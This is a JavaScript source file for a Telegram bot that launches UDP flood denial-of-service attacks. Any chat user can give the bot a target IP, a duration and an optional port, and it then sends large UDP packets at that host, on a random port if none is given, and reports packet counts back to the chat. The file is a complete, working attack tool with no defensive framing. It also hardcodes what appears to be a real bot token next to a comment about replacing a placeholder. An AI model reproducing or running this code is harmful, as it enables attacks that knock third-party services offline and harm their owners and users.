const TelegramBot = require('node-telegram-bot-api');
const dgram = require('dgram');

// Replace 'YOUR_TELEGRAM_BOT_TOKEN' with the token you get from BotFather
const token = '6725616382:AAFThqEKrBdWBNvomNBucwvoH2GmSC2Zx90';
const bot = new TelegramBot(token, { polling: true });

// Function to perform UDP flood
const udpFlood = (chatId, host, duration, port) => {
  const client = dgram.createSocket('udp4');
  const message = Buffer.alloc(65000, 'X');

  const endTime = Date.now() + duration * 1000;
  let packets = 0;

  // Function to send packets
  const sendPacket = () => {
    if (Date.now() > endTime) {
      client.close();
      bot.sendMessage(chatId, `UDP Flood completed with ${packets} packets.`);
      return;
    }
    packets++;
    const targetPort = port || Math.floor(Math.random() * 65535) + 1;
    client.send(message, 0, message.length, targetPort, host, (err) => {
      if (err) {
        console.error(`Error: ${err.message}`);
      }
      sendPacket();
    });
  };

  // Start sending packets
  sendPacket();

  // Update user every second with the current packet count
  const updateInterval = setInterval(() => {
    if (Date.now() > endTime) {
      clearInterval(updateInterval);
    } else {
      bot.sendMessage(chatId, `Packets sent: ${packets}`);
    }
  }, 1000);
};

// Handler for the /start command
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, 'Welcome to the UDP Flood Bot. Send /udp <IP> <duration> <port (optional)> to start the flood.');
});

// Handler for the /udp command with parameters
bot.onText(/\/udp (.+) (.+) ?(\d+)?/, (msg, match) => {
  const chatId = msg.chat.id;
  const host = match[1];
  const duration = parseInt(match[2], 10);
  const port = match[3] ? parseInt(match[3], 10) : null;

  if (!host || isNaN(duration) || duration <= 0) {
    bot.sendMessage(chatId, 'Invalid parameters. Usage: /udp <IP> <duration> <port (optional)>');
    return;
  }

  bot.sendMessage(chatId, `Starting UDP flood on ${host} for ${duration} seconds on port ${port || 'random'}.`);
  udpFlood(chatId, host, duration, port);
});
